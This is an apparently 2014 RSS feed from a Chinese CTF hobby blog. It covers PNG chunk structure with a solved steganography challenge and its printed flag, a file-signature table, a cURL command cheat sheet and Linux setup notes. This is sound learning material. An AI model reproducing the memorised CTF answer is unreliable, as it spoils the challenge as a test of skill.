<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[evilddog's blog]]></title>
  <subtitle><![CDATA[在一群出色的人中间,误以为自己也是其中一员,然后忘了努力]]></subtitle>
  <link href="/rss.xml" rel="self"/>
  <link href="http://evilddog.github.io/"/>
  <updated>2014-11-13T15:49:28.336Z</updated>
  <id>http://evilddog.github.io/</id>
  
  <author>
    <name><![CDATA[evilddog]]></name>
    <email><![CDATA[root.evilddog@gmail.ocm]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[PNG图片结构分析和取证]]></title>
    <link href="http://evilddog.github.io/2014/11/10/png-struct/"/>
    <id>http://evilddog.github.io/2014/11/10/png-struct/</id>
    <published>2014-11-10T10:58:02.000Z</published>
    <updated>2014-11-12T08:15:57.000Z</updated>
    <content type="html"><![CDATA[<p><br></p>
<hr>

<h1 id="0x00_废话">0x00 废话</h1>
<p>最近比赛略忙,一大堆作业(摔,没有时间学点新的东西,意外抓到一只成信工的大牛,帅此牛write-up的时候发现 <a href="http://appleu0.sinaapp.com/?p=194" target="_blank" rel="external">png</a> 取证的一片文章,于是顺便学习一下PNG图片结构问题.<br><a id="more"></a><br>因为单独讲解比较无聊,所以会用某CTF的一道水题当作例子分析图片结构</p>
<p><img src="http://evilddog.qiniudn.com/stego_final.png" alt=""></p>
<p><br></p>
<h1 id="0x01_PNG文件结构分析:">0x01  PNG文件结构分析:</h1>
<p>PNG是一种位图文件(bitmap file)存储格式，读成“ping”。PNG用来存储灰度图像时，灰度图像的深度最多16位，存储彩色图像时，彩色图像的深度最多48位，并且还可存储多到16位的α通道数据。</p>
<h2 id="整个PNG的数据组成是如下结构:">整个PNG的数据组成是如下结构:</h2>
<p><img src="http://evilddog.qiniudn.com/PNG-struct.png" alt=""></p>
<h2 id="文件头:">文件头:</h2>
<p>每一个PNG图片的<a href="http://err02.com/2014/11/09/file-header/" target="_blank" rel="external">文件标志</a>都是如下固定的,长度为八字节(00000000-0000007):<br><img src="http://evilddog.qiniudn.com/PNG-header.png" alt=""></p>
<p>示例文件结构:<br><img src="http://evilddog.qiniudn.com/png-head-example.png" alt=""></p>
<p><br></p>
<h2 id="PNG数据块(Chunk)">PNG数据块(Chunk)</h2>
<p>有两种,一种是关键数据块,也是标准数据块,还有一种是辅助数据块也叫可选数据块.</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。</div><div class="line">PNG文件规范没有要求PNG编译码器对可选数据块进行编码和译码，但规范提倡支持可选数据块。</div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="PNG数据块类别如下,关键数据块为加深部分:">PNG数据块类别如下,关键数据块为加深部分:</h2>
<p><img src="http://evilddog.qiniudn.com/data-struct.png" alt=""></p>
<p><br></p>
<h2 id="数据块统一结构:">数据块统一结构:</h2>
<p>每个数据块由四个部分组成:<br><img src="http://evilddog.qiniudn.com/Screenshot - 2014年11月10日 - 21时15分10秒.png" alt=""></p>
<p>尤其要注意的是CRC(循环冗余校验码),在每个数据块中它是对Chunk Type Code 和 Chunk Data域中的数据进行计算得到,虽然不可逆,但是我们在一定条件下可以通过爆破得到,计算方式如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</div></pre></td></tr></table></figure>

<p>下面只重点讲解关键数据块</p>
<p><br></p>
<h1 id="0x02_IHDR">0x02  IHDR</h1>
<p>文件头数据块IHDR(header chunk)包含有PNG中储存的图像数据的基本信息,并要作为第一个数据块出现在PNG数据块中</p>
<p>文件结构如下:<br><img src="http://evilddog.qiniudn.com/IHDR.png" alt=""></p>
<p><br></p>
<p>即图中0000008~0000020,实例如下:<br><img src="http://evilddog.qiniudn.com/Screenshot - 2014年11月10日 - 21时21分17秒.png" alt=""></p>
<p><br></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">初始的4字节为数据块数据的长度<span class="value">:<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D,<span class="number">13</span>字节</span></div><div class="line">接下来是该数据块类型:<span class="number">49</span> <span class="number">48</span> <span class="number">44</span> <span class="number">52</span>,IHDR</div><div class="line">然后是数据块数据:宽-<span class="number">00</span> <span class="number">00</span> <span class="number">05</span> <span class="number">00</span>,<span class="number">1280</span>像素;</div><div class="line">              高-00 00 04 00,1024;</div><div class="line">              像素深度<span class="value">:<span class="number">08</span>,<span class="number">2</span>^<span class="number">8</span>=<span class="number">256</span>,即这是一个<span class="number">256</span>色的图像;</span></div><div class="line">              06,颜色类型,带α通道数据的真彩色图像,8或16;</div><div class="line">最后的是crc<span class="value">:BE <span class="number">93</span> F4 <span class="number">43</span></span></div></pre></td></tr></table></figure>

<p><br></p>
<h1 id="0x03_IDAT">0x03 IDAT</h1>
<p>0000020到000336之间都是可选数据块,不再累述,直接跳到IDATA部分;</p>
<p><img src="" alt=""></p>
<p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像,是最重要的部分</p>
<p>IDAT 区块是经过压缩的，所以数据不可读 ，压缩算法一般为LZ77滑动窗口算法，如果硬要看里面的数据的话，用zlib库也是可以的</p>
<p>想深入研究的话请看如下链接</p>
<p><a href="http://www.web-tinker.com/article/20471.html" target="_blank" rel="external"></a><br><a href="http://jens.quicknote.de/comp/LZ77-JensMueller.pdf" target="_blank" rel="external"></a></p>
<p>IDAT的结构也一样和其他数据块一样:长度;标识；数据块数据；CTC数据,因为第三块数据块太长了,所以就不上图了</p>
<p><br></p>
<h1 id="0x04_IEND">0x04  IEND</h1>
<p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">49</span> <span class="number">45</span> <span class="number">4</span><span class="keyword">E</span> <span class="number">44</span> AE <span class="number">42</span> <span class="number">60</span> <span class="number">82</span></div></pre></td></tr></table></figure>

<p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p>
<p><br></p>
<h1 id="0x05_您的好友”赛棍”已上线">0x05  您的好友”赛棍”已上线</h1>
<p>前面分析的时候我们可以看得到这个图片的阿尔法通道中是有隐藏信息的</p>
<p>所以我们要先提取出来这个隐藏的图片信息,有两种方法:</p>
<p><b>00 : <a href="http://www.wechall.net/forum-t527/Stegsolve_1_3.html" target="_blank" rel="external">Stegsolve</a></b></p>
<p>通过Stegsolve阿尔法通道2可以很清楚地看到隐藏了二维码:</p>
<p><img src="http://evilddog.qiniudn.com/阿尔法通道.png" alt=""></p>
<p>然后保存下来之后再XOR一下就能清楚的看到是一正常的二维码</p>
<p><img src="http://evilddog.qiniudn.com/flag.png" alt=""></p>
<p>扫描即得flag</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag{hctf_3xF<span class="variable">$235</span><span class="comment">#\x5e3}</span></div></pre></td></tr></table></figure>

<p><b>01 : Python</b></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><br></p>
<hr>

<h1 id="0x00_废话">0x00 废话</h1>
<p>最近比赛略忙,一大堆作业(摔,没有时间学点新的东西,意外抓到一只成信工的大牛,帅此牛write-up的时候发现 <a href="http://appleu0.sinaapp.com/?p=194" target="_blank" rel="external">png</a> 取证的一片文章,于是顺便学习一下PNG图片结构问题.<br>]]>
    
    </summary>
    
      <category term="png" scheme="http://evilddog.github.io//tags/png/"/>
    
      <category term="CTF" scheme="http://evilddog.github.io//categories/CTF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[各类文件的文件头]]></title>
    <link href="http://evilddog.github.io/2014/11/09/file-header/"/>
    <id>http://evilddog.github.io/2014/11/09/file-header/</id>
    <published>2014-11-09T07:39:21.000Z</published>
    <updated>2014-11-09T08:21:18.000Z</updated>
    <content type="html"><![CDATA[<p><br></p>
<hr>

<h2 id="0x00_各种常用文件的文件头格式">0x00 各种常用文件的文件头格式</h2>
<p>MISC还有信息隐藏经常有各种蛋疼的图片隐藏还有修复图片的题目,简直不会,所以记下备忘</p>
<a id="more"></a>

<h2 id="0x01">0x01</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">File                             Type                          ExtensionsHeader</div><div class="line">               </div><div class="line">JPEG                             jpg<span class="comment">;jpeg                      0xFFD8FF</span></div><div class="line">PNG                              png                           <span class="number">0x89504E470D0A1A0A</span></div><div class="line">GIF                              gif                           <span class="number">47494638</span> </div><div class="line">TIFF                             tif<span class="comment">;tiff                      0x49492A00</span></div><div class="line">TIFF                             tif<span class="comment">;tiff                      0x4D4D002A</span></div><div class="line">Bit   map                        bmp                           BM</div><div class="line">AOL ART                          art                           <span class="number">0x4A47040E000000</span></div><div class="line">PC Paintbrush                    pcx                           <span class="number">0x0A050108</span></div><div class="line">Graphics Metafile                wmf                           <span class="number">0xD7CDC69A</span></div><div class="line">Graphics Metafile                wmf                           <span class="number">0x01000900</span></div><div class="line">Graphics Metafile                wmf                           <span class="number">0x02000900</span></div><div class="line">Enhanced Metafile                emf                           <span class="number">0x0100000058000000</span></div><div class="line">Corel Draw                       cdr                           CDR</div><div class="line">CAD                              dwg                           <span class="number">0x41433130</span></div><div class="line">Adobe Photoshop                  psd                           8BPS</div><div class="line">Rich Text Format                 rtf                           rtf</div><div class="line">XML                              xml                           3C3F786D6C   </div><div class="line">HTML                 html<span class="comment">;htm;php;php3;php4;phtml;shtml        68746D6C3E </span></div><div class="line">Email                            eml                           Delivery-date:</div><div class="line">Outlook Express                  <span class="number">dbx</span>                           <span class="number">0xCFAD12FE</span></div><div class="line">MS Office/OLE2     doc<span class="comment">;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db  0xD0CF11E0A1B11AE1</span></div><div class="line">MS Access                        mdb<span class="comment">;mda;mde;mdt               Standard J</span></div><div class="line">WordPerfect                      wpd                           <span class="number">0xFF575043</span></div><div class="line">OpenOffice Writer                sxw                           writer</div><div class="line">OpenOffice Calc                  sxc                           calc</div><div class="line">OpenOffice Math                  sxm                           math</div><div class="line">OpenOffice Impress               sxi                           impress</div><div class="line">OpenOffice Draw                  sxd                           draw</div><div class="line">Adobe FrameMaker                 fm                            &lt;MAKERFILE</div><div class="line">PostScript                eps.or.ps<span class="comment">;ps;eps                     %!PS-Adobe</span></div><div class="line">Adobe Acrobat                    pdf                           %PDF-<span class="number">1</span>.</div><div class="line">Quicken                          qdf                           <span class="number">0xAC9EBD8F</span></div><div class="line">QuickBooks Backup                qbb                           <span class="number">0x458600000600</span></div><div class="line">Sage                sly.or.srt.or.slt<span class="comment">;sly;srt;slt              0x53520100</span></div><div class="line">Sage Backup                      <span class="number">1</span>                             SAGEBACKUP</div><div class="line">Lotus WordPro v9                 lwp                           <span class="number">0x576F726450726F</span></div><div class="line">Lotus <span class="number">123</span> v9                     <span class="number">123</span>                           <span class="number">0x00001A00051004</span></div><div class="line">Lotus <span class="number">123</span> v5                     wk4                           <span class="number">0x00001A0002100400</span></div><div class="line">Lotus <span class="number">123</span> v3                     wk3                           <span class="number">0x00001A0000100400</span></div><div class="line">Lotus <span class="number">123</span> v1                     wk1                           <span class="number">0x2000604060</span></div><div class="line">Windows Password                 pwl                           <span class="number">0xE3828596</span></div><div class="line">ZIP Archive                      zip<span class="comment">;jar                       0x504B0304</span></div><div class="line">ZIP Archive (outdated)           zip                           <span class="number">0x504B3030</span></div><div class="line">RAR Archive                      rar                           Rar!</div><div class="line">GZ Archive                       gz<span class="comment">;tgz                        0x1F8B08</span></div><div class="line">BZIP Archive                     bz2                           BZh</div><div class="line">ARJ Archive                      arj                           <span class="number">0x60EA</span></div><div class="line"><span class="number">7</span>－ZIP Archive                   7z                            7z集<span class="string">'</span></div><div class="line">Wave                             wav                           WAVE</div><div class="line">AVI                              avi                           AVI </div><div class="line">Real Audio                       ram;ra                        .ra?0</div><div class="line">Real Media                       rm                            .RMF</div><div class="line">MPEG                             mpg;mpeg                      0x000001BA</div><div class="line">MPEG                             mpg;mpeg                      0x000001B3</div><div class="line">Quicktime                        mov                           moov</div><div class="line">Windows Media                    asf                           0x3026B2758E66CF11</div><div class="line">MIDI                             mid                           MThd</div><div class="line">ELF Executable                   elf;;                          0x7F454C4601010100</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<p><br></p>
<hr>

<h2 id="0x00_各种常用文件的文件头格式">0x00 各种常用文件的文件头格式</h2>
<p>MISC还有信息隐藏经常有各种蛋疼的图片隐藏还有修复图片的题目,简直不会,所以记下备忘</p>
]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[cURL 常用命令]]></title>
    <link href="http://evilddog.github.io/2014/11/05/curl/"/>
    <id>http://evilddog.github.io/2014/11/05/curl/</id>
    <published>2014-11-05T02:36:54.000Z</published>
    <updated>2014-11-06T01:07:03.000Z</updated>
    <content type="html"><![CDATA[<hr>

<h1 id="0x00_简介">0x00   简介</h1>
<p>curl是利用URL语法在命令行方式下工作的开源文件传输工具。</p>
<p>它支持很多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl.</p>
<a id="more"></a>

<p>同样支持HTTPS认证，HTTP POST方法， HTTP PUT方法， FTP上传， kerberos认证，HTTP上传，代理服务器， cookies， 用户名/密码认证， 下载文件断点续传，上载文件断点续传，http代理服务器管道（ proxy tunneling）， 甚至它还支持IPv6， socks5代理服务器，通过http代理服务器上传文件到FTP服务器等等，功能十分强大。<br><br></p>
<h1 id="0x01_常用命令">0x01   常用命令</h1>
<p><br></p>
<h2 id="—-_下载单个文件">—- 下载单个文件</h2>
<p>下面的命令将URL的内容和显示在终端</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http:<span class="comment">//www.baidu.com</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-_通过-o/-O选项保存下载的文件到指定的文件中：">—- 通过-o/-O选项保存下载的文件到指定的文件中：</h2>
<ul>
<li>-o：将文件保存为命令行中指定的文件名的文件中</li>
<li>-O：使用URL中默认的文件名保存文件到本地</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">#将文件下载到本地并命名为mygettext.html</span></div><div class="line">curl -o mygettext.html http:<span class="comment">//www.gnu.org/software/gettext/manual/gettext.html</span></div><div class="line"><span class="preprocessor"># 将文件保存到本地并命名为gettext.html</span></div><div class="line">curl -O http:<span class="comment">//www.gnu.org/software/gettext/manual/gettext.html</span></div></pre></td></tr></table></figure>

<p>可以用转向字符”&gt;”对输出进行转向输出</p>
<p><br></p>
<h2 id="—-_通过-L选项进行重定向">—- 通过-L选项进行重定向</h2>
<p>默认情况下cURL不会发送HTTP Location headers(重定向).当一个被请求页面移动到另一个站点时，会发送一个HTTP Loaction header作为请求，<br>然后将请求重定向到新的地址上。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">~$ curl http://www.google.com</div><div class="line"><span class="tag">&lt;<span class="title">HTML</span>&gt;</span><span class="tag">&lt;<span class="title">HEAD</span>&gt;</span><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"content-type"</span> <span class="attribute">content</span>=<span class="value">"text/html;charset=utf-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">TITLE</span>&gt;</span>302 Moved<span class="tag">&lt;/<span class="title">TITLE</span>&gt;</span><span class="tag">&lt;/<span class="title">HEAD</span>&gt;</span><span class="tag">&lt;<span class="title">BODY</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">H1</span>&gt;</span>302 Moved<span class="tag">&lt;/<span class="title">H1</span>&gt;</span></div><div class="line">The document has moved</div><div class="line"><span class="tag">&lt;<span class="title">A</span> <span class="attribute">HREF</span>=<span class="value">"http://www.google.co.jp/?gfe_rd=cr&amp;ei=g9BZVLnLGsum8weI3YDoDA"</span>&gt;</span>here<span class="tag">&lt;/<span class="title">A</span>&gt;</span>.</div><div class="line"><span class="tag">&lt;/<span class="title">BODY</span>&gt;</span><span class="tag">&lt;/<span class="title">HTML</span>&gt;</span></div></pre></td></tr></table></figure>

<p>上述输出说明所请求的档案被转移到了<a href="http://www.google.co.jp" target="_blank" rel="external">http://www.google.co.jp</a></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 让curl使用地址重定向，此时会查询google.com.hk站点</span></div><div class="line">~$ curl -L http:<span class="comment">//www.google.com</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-_断点续传">—- 断点续传</h2>
<p>通过使用-C选项可对大文件使用断点续传功能</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 当文件在下载完成之前中断</span></div><div class="line">$ curl -O http:<span class="comment">//www.baidu.com/index.html</span></div><div class="line"><span class="preprocessor">##############             20.1%</span></div><div class="line"><span class="preprocessor"># 通过添加-C选项继续对该文件进行下载，已经下载过的文件不会被重新下载</span></div><div class="line">curl -C - -O http:<span class="comment">//www.gnu.org/software/gettext/manual/gettext.html</span></div><div class="line"><span class="preprocessor">###############            21.1%</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-_对cURL使用网络限速">—- 对cURL使用网络限速</h2>
<p>通过—limit-rate选项对CURL的最大网络使用进行限制</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">下载速度限制在<span class="number">1000</span>B/s</div><div class="line">curl --limit-rate <span class="number">1000</span>B -<span class="constant">O</span> <span class="symbol">http:</span>/<span class="regexp">/www.gnu.org/software</span><span class="regexp">/gettext/manual</span><span class="regexp">/gettext.html</span></div></pre></td></tr></table></figure>

<p>通过-z下载指定时间内修改过的文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 若yy.html文件在2014/12/21之后有过更新才会进行下载</span></div><div class="line">curl -z <span class="number">21</span>-Dec-<span class="number">14</span> http:<span class="comment">//www.baidu.com/index.html</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-CURL授权">—-CURL授权</h2>
<p>curl -z 21-Dec-11 <a href="http://www.example.com/yy.html" target="_blank" rel="external">http://www.example.com/yy.html</a></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl -u username:password <span class="built_in">URL</span></div><div class="line"><span class="comment"># 通常的做法是在命令行只输入用户名，之后会提示输入密码，这样可以保证在查看历史记录时不会将密码泄露</span></div><div class="line">curl -u username <span class="built_in">URL</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-从FTP服务器下载文件">—-从FTP服务器下载文件</h2>
<p>CURL同样支持FTP下载，若在url中指定的是某个文件路径而非具体的某个要下载的文件名，CURL则会列出该目录下的所有文件名而并非下载该目录下的所有文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 列出public_html下的所有文件夹和文件</span></div><div class="line">curl -u ftpuser:ftppass -O ftp:<span class="comment">//ftp_server/public_html/</span></div><div class="line"><span class="preprocessor"># 下载xss.php文件</span></div><div class="line">curl -u ftpuser:ftppass -O ftp:<span class="comment">//ftp_server/public_html/xss.php</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-上传文件到FTP服务器">—-上传文件到FTP服务器</h2>
<p>通过 -T 选项可将指定的本地文件上传到FTP服务器上</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 将myfile.txt文件上传到服务器</span></div><div class="line">curl -u ftpuser:ftppass -T myfile.txt ftp:<span class="comment">//ftp.testserver.com</span></div><div class="line"><span class="preprocessor"># 同时上传多个文件</span></div><div class="line">curl -u ftpuser:ftppass -T <span class="string">"{file1,file2}"</span> ftp:<span class="comment">//ftp.testserver.com</span></div><div class="line"><span class="preprocessor"># 从标准输入获取内容保存到服务器指定的文件中</span></div><div class="line">curl -u ftpuser:ftppass -T - ftp:<span class="comment">//ftp.testserver.com/myfile_1.txt</span></div></pre></td></tr></table></figure>

<p>通过使用 -v 和 -trace获取更多的链接信息</p>
<p><br></p>
<h2 id="—-通过字典查询单词">—-通过字典查询单词</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 查询bash单词的含义</span></div><div class="line">curl <span class="symbol">dict:</span>/<span class="regexp">/dict.org/d</span><span class="symbol">:bash</span></div><div class="line"><span class="comment"># 列出所有可用词典</span></div><div class="line">curl <span class="symbol">dict:</span>/<span class="regexp">/dict.org/show</span><span class="symbol">:db</span></div><div class="line"><span class="comment"># 在foldoc词典中查询bash单词的含义</span></div><div class="line">curl <span class="symbol">dict:</span>/<span class="regexp">/dict.org/d</span><span class="symbol">:bash</span><span class="symbol">:foldoc</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-为CURL设置代理">—-为CURL设置代理</h2>
<p>-x 选项可以为CURL添加代理功能</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 指定代理主机和端口</span></div><div class="line">curl -x proxysever.test.com:<span class="number">3128</span> http:<span class="comment">//google.co.in</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-保存与使用网站cookie信息">—-保存与使用网站cookie信息</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># 将网站的cookies信息保存到sugarcookies文件中</span></div><div class="line">curl -D sugarcookies http:<span class="comment">//localhost/sugarcrm/index.php</span></div><div class="line"><span class="preprocessor"># 使用上次保存的cookie信息</span></div><div class="line">curl -b sugarcookies http:<span class="comment">//localhost/sugarcrm/index.php</span></div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="—-传递请求数据">—-传递请求数据</h2>
<p>默认curl使用GET方式请求数据，这种方式下直接通过URL传递数据<br>可以通过 —data/-d 方式指定使用POST方式传递数据</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># GET</span></div><div class="line">curl -u username https:<span class="comment">//api.github.com/user?access_token=XXXXXXXXXX</span></div><div class="line"><span class="preprocessor"># POST</span></div><div class="line">curl -u username --data <span class="string">"param1=value1&param2=value"</span> https:<span class="comment">//api.github.com</span></div><div class="line"><span class="preprocessor"># 也可以指定一个文件，将该文件中的内容当作数据传递给服务器端</span></div><div class="line">curl --data @filename https:<span class="comment">//github.api.com/authorizations</span></div></pre></td></tr></table></figure>

<p><del>默认情况下，通过POST方式传递过去的数据中若有特殊字符，首先需要将特殊字符转义在传递给服务器端，如value值中包含有空格，则需要先将空格转换成%20<del></del></del></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="operator">-d</span> <span class="string">"value%201"</span> http://hostname.com</div></pre></td></tr></table></figure>

<p>在新版本的CURL中，提供了新的选项 —data-urlencode，通过该选项提供的参数会自动转义特殊字符。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="subst">--</span><span class="built_in">data</span><span class="attribute">-urlencode</span> <span class="string">"value 1"</span> http:<span class="comment">//hostname.com</span></div></pre></td></tr></table></figure>

<p>除了使用GET和POST协议外，还可以通过 -X 选项指定其它协议，如：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -I -X <span class="keyword">DELETE</span> https:<span class="comment">//api.github.cim</span></div></pre></td></tr></table></figure>

<p>上传文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">curl</span> --form <span class="string">"fileupload=<span class="variable">@filename</span>.txt"</span> <span class="url">http://hostname/resource</span></div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<hr>

<h1 id="0x00_简介">0x00   简介</h1>
<p>curl是利用URL语法在命令行方式下工作的开源文件传输工具。</p>
<p>它支持很多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl.</p>
]]>
    
    </summary>
    
      <category term="curl" scheme="http://evilddog.github.io//tags/curl/"/>
    
      <category term="Tools" scheme="http://evilddog.github.io//categories/Tools/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Backbox]]></title>
    <link href="http://evilddog.github.io/2014/11/02/backbox/"/>
    <id>http://evilddog.github.io/2014/11/02/backbox/</id>
    <published>2014-11-02T09:02:35.000Z</published>
    <updated>2014-11-05T16:14:07.000Z</updated>
    <content type="html"><![CDATA[<p><hr><br>hhhhhhhh最近又在做死，kali被折腾坏掉了，在虚拟机中产生尝试了一下backbox</p>
<p>因为基于Ubuntu14.04优化了Gnome的桌面，用起来很流畅，占用资源也小，再坏掉我就换CentOS(╯°Д°)╯︵ ┻━┻于是写下配置记录下某些蛋疼的设置</p>
<a id="more"></a>

<h3 id="sublime-text-2">sublime-text-2</h3>
<p>从官网下载之后</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar xf Sublime <span class="built_in">Text</span> <span class="number">2.0</span>.<span class="number">1</span>.tar.bz2</div></pre></td></tr></table></figure>

<p>cp到合适的地方</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo mv Sublime<span class="command">\ </span>Text<span class="command">\ </span>2 /usr/lib/</div></pre></td></tr></table></figure>

<p>如果想在终端中使用sublime</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ln -s <span class="regexp">/usr/</span>lib<span class="regexp">/Sublime\ Text\ 2/</span>sublime_text <span class="regexp">/usr/</span>bin<span class="regexp">/sublime</span></div></pre></td></tr></table></figure>

<p>在粘贴到文件中配置</p>
